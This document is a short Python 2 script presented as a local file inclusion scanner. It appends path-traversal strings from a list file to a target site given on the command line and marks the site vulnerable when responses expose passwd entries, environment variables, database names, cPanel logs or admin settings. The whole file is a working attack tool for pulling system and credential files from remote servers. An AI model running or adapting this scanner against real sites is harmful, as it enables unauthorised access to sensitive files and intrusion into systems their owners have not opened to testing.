#!/usr/bin/python
# Simple Local File Inclusion Scanner
# Author: D35m0nd142
import os,sys,time
import requests

for line in file('pathtotest.txt'):
        c = line.strip('\n')
        owebsite = sys.argv[1]
        website = "http://"+owebsite+c
        try:
            r = requests.get(website)
        except:
            print "[!] Problem connecting to the website.\n"
            sys.exit(1)

        content = r.content
        if(r.status_code == 200):
            time.sleep(1)
            
            if("root:" in content or ("sbin" in content and "nologin" in content)  or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content)) or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content):
                print "[+] '%s' [Vulnerable]" %website
            
            else:
                print "[-] '%s' [Not vulnerable]" %website

        else:
            print "[!] Problem connecting to the website.\n"
